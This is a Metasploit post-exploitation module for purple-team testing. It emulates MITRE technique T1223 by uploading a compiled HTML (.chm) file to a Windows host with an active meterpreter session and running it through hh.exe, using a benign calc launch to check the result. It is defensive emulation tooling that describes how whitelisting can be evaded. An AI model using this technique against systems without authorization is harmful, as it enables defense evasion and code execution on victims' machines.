##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv

  include Msf::Post::Windows::Purple

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Compiled HTML File (T1223) Windows - Purple Team',
        'Description'   => %q{
          Defense Evasion, Execution: Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. CHM content is displayed using underlying components of the Internet Explorer browser loaded by the HTML Help executable program (hh.exe).

          Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/techniques/T1223/'] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('LFILE', [true, 'CHM payload', ::Msf::Config.data_directory + "/purple/t1223/t1223.chm"]),
        OptString.new('RFILE', [true, 'Remote CHM path', "C:\\t1223.chm"]),
        OptBool.new('CLEANUP', [true, 'Cleanup files after execution', true])
      ])
  end

  def kill_hh(finish=false)
    found_hh = false
    all_processes = client.sys.process.get_processes
    all_processes.each do |process|
      if process['name'] =~ /[Hh]h/
        print_good("Found an instance of hh.exe running. Killing it.")
        client.sys.process.kill(process['pid'])
        found_hh = true
      end
    end
    if finish and not found_hh
      print_warning("hh.exe not found module execution may have failed.")
    end
  end


  def _cleanup
  #
  #   Remove .chm file.
  #   Kill hh.exe.
  #   Kill calc.
  #
    print_status("Cleaning up...")
    register_files_for_cleanup(datastore['RFILE'])
    kill_hh(true)
    kill_calc(true)
  end


  def run
  #
  #
  #
    begin
      raise "Module requires meterpreter session." unless is_admin?

      print_status("Killing existing instances of calc and hh.exe")
      kill_hh()
      kill_calc()

      # upload the file
      local_file_path = datastore['LFILE']
      remote_file_path = datastore['RFILE']
      print_status("Uploading #{local_file_path} to #{remote_file_path}...")
      upload_file(remote_file_path, local_file_path)

      # run the payload using hh.exe
      run_cmd("hh.exe #{remote_file_path}", false)

      sleep(3)

      # check for successful execution
      check_for_calc()

      _cleanup unless not datastore['CLEANUP']

      print_good("Module T1223 execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1223 execution failed.")
    end
  end

end
